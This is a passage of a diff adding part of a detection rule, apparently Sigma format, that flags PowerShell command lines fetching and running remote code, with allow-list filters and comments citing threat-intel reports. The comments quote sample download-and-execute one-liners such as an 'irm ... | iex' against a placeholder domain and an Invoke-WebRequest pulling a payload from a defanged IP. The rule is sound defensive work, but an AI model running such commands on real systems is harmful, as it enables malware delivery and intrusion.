+              - 'wget ' # https://www.esentire.com/blog/dindoor-denorat-and-nightshadec2-analyzing-tag-150s-evolving-tradecraft; https://www.zscaler.com/blogs/security-research/operation-rapidrust-apt36-deploys-rustyshade-rustymove-psnatch-and
+              - 'http'
+          - CommandLine|contains|all:
+              #- 'powershell'
+              - 'invoke' #https://www.huntress.com/blog/active-exploitation-solarwinds-web-help-desk-cve-2025-26399; https://www.seqrite.com/blog/operation-camelclone-multi-region-espionage-campaign-targets-government-and-defense-entities-amidst-regional-tensions/; https://www.catonetworks.com/blog/cato-ctrl-vishing-and-microsoft-teams-used-deliver-phantombackdoor/; https://labs.k7computing.com/index.php/resoker-a-telegram-based-remote-access-trojan/; https://www.malwarebytes.com/blog/bugs/2026/05/700-education-and-tech-websites-hijacked-in-huge-clickfix-malware-campaign; https://www.seqrite.com/blog/operation-shadowrecruit-a-recruitment-themed-malware-campaign-leveraging-controlr-and-google-sheets-to-target-indian-job-seekers/; https://www.huntress.com/blog/sql-injection-attacker-persistence
+              - 'webrequest' #https://www.elastic.co/security-labs/a-wretch-client; https://meltedinhex.com/posts/clickfix-errtraffic-blockchain-c2/; https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/; https://zerobec.com/blog/operation-bluedash-multi-rmm-workplace-phishing; https://www.zscaler.com/blogs/security-research/helpdesk-hijackers-teams-vishing-quick-assist-and-gogrpc-backdoor; https://fieldeffect.com/blog/clickfix-cluster-observed-activity-recent-campaigns; https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/; https://www.security.com/threat-intelligence/warlock-ransomware-critical-infrastructure
+              - 'http' #powershell.exe invoke-webrequest -uri “hxxp://45.58.52[.]82/up.dat” -outfile “c:\programdata\img.dat”; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/; https://blog.talosintelligence.com/uat-8099-new-persistence-mechanisms-and-regional-focus/; https://www.proofpoint.com/us/blog/threat-insight/dont-trustconnect-its-a-rat?utm_source=twitter&utm_medium=social_organic; https://www.picussecurity.com/resource/blog/t1059-001-powershell; https://www.trendmicro.com/en_us/research/26/c/boryptgrab-stealer-targets-users-via-deceptive-github-pages.html
+          - CommandLine|contains|all:
+              - 'InstallProduct'
+              - 'http'
+          - CommandLine|contains|all:
+              #- 'powershell'
+              - 'invoke'
+              - 'RestMethod' #https://www.huntress.com/blog/active-exploitation-solarwinds-web-help-desk-cve-2025-26399; https://sect.iij.ad.jp/blog/2026/03/dropbox-api-kimsuky-malware/; https://asec.ahnlab.com/en/93151/
+          - CommandLine|contains|all:
+              - 'irm' # powershell irm maliciousdomain[.]com | iex; https://www.zscaler.com/blogs/security-research/apt-attacks-target-indian-government-using-sheetcreep-firepower-and; https://www.levelblue.com/blogs/spiderlabs-blog/how-clickfix-opens-the-door-to-stealthy-stealc-information-stealer; https://www.proofpoint.com/us/blog/threat-insight/dont-trustconnect-its-a-rat; https://www.recordedfuture.com/research/clickfix-campaigns-targeting-windows-and-macos; https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ai-written-malware-vibe-coded-campaign/; https://www.rapid7.com/blog/post/tr-operation-asterix-crypto-fraud-vishing-phishing/
+              - 'iex' # https://reliaquest.com/blog/threat-spotlight-deepload-malware-pairs-clickfix-delivery-with-ai-generated-evasion/; https://www.jumpsec.com/guides/inside-a-dprk-bluenoroff-clickfix-kit/; https://www.bleepingcomputer.com/news/security/steam-forum-clickfix-attacks-infect-gamers-with-xmrig-cryptominers/; https://www.microsoft.com/en-us/security/blog/2026/09/02/impersonating-it-support-threat-actors-turn-remote-session-into-enterprise-wide-access/
+      filters:
+          - Image|endswith: 'MicrosoftEdgeUpdate.exe'
+          - ParentImage|contains: 'CRUWBlocker-' #write blocker software CRUWBlocker-1.2.1.2-(2018.09.04).tmp
+          - ParentImage|endswith:
+              - '_1st.exe' #PICUS BAS
+              - 'mssense.exe' #Defender
+          - Image|endswith:
+              - 'SenseNdr.exe' #Defender
+              - 'codex-computer-use.exe'
+          - CommandLine|contains:
+              - 'licensing.mp.microsoft.com/' #powershell.exe  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm https://licensing.mp.microsoft.com/v7.0/licenses/content -Method POST"
+              - '127.0.0.1' # Local host
+              - 'https://astral.sh'
+          - CommandLine|contains|all:
+              - 'crashpad_handler'
+              - 'database'
+          - CommandLine|contains|all:
+              - 'officecdn.microsoft.com/'
+              - '.cab' #"powershell" -command "& { (New-Object Net.WebClient).DownloadFile('http://officecdn.microsoft.com/pr/f2e724c1-748f-4b47-8fb8-8e0d210e9208/Office/Data/16.0.10412.20006/i641033.cab', 'C:\Users\xxx\AppData\Local\Temp\over568100\i641033.cab') }"
+          - CommandLine|contains|all:
+              - 'chrome'
+              - 'single' # "chrome.exe" --single-argument https://identity...
+              - 'argument'
+          - CommandLine|contains|all:
+              - 'sysvol' #GPO contains powershell sctipts.
+              - 'Policies'
+          - CommandLine|contains|all:
+              - 'echo '
+              - 'nessus_cmd_' #C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe  echo nessus_cmd_Z2V0LWhlbHAgSW52b2tlLVJlc3RNZXRob2Q=_start ; get-help Invoke-RestMethod ; echo nessus_cmd_Z2V0LWhlbHAgSW52b2tlLVJlc3RNZXRob2Q=_stop ; echo nessus_cmd_SW52b2tlLVJlc3RNZXRob2QgLU1ldGhvZCBHRVQgLUhlYWRlcnMgQHt9IGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvb3BjL3YxL2luc3RhbmNlIDI+JjE=_start ; Invoke-RestMethod -Method GET -Headers @{} http://169.254.169.254/opc/v1/instance ; echo nessus_cmd_SW52b2tlLVJlc3RNZXRob2QgLU1ldGhvZCBHRVQgLUhlYWRlcnMgQHt9IGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvb3BjL3YxL2luc3RhbmNlIDI+JjE=_stop ;
+          - CommandLine|contains|all:
+              - 'slackb.com' #GPO contains powershell sctipts.
+              - 'WebRequest'
+              - 'Servicing_Channel' #powershell.exe -c Invoke-WebRequest -Uri https://slackb.com/error -M...537.36 OS_Product/Workstation Servicing_Channel/SAC...| ConvertTo-Json
+      condition: selection_bin and ((selection1 and selection2) or selection3) and not filters
+  falsepositives:
+      - Administrative activity
+  level: high
+level: high
+created: '2020-03-24T12:46:08Z'
+updated: '2026-10-29T12:01:17.740000Z'
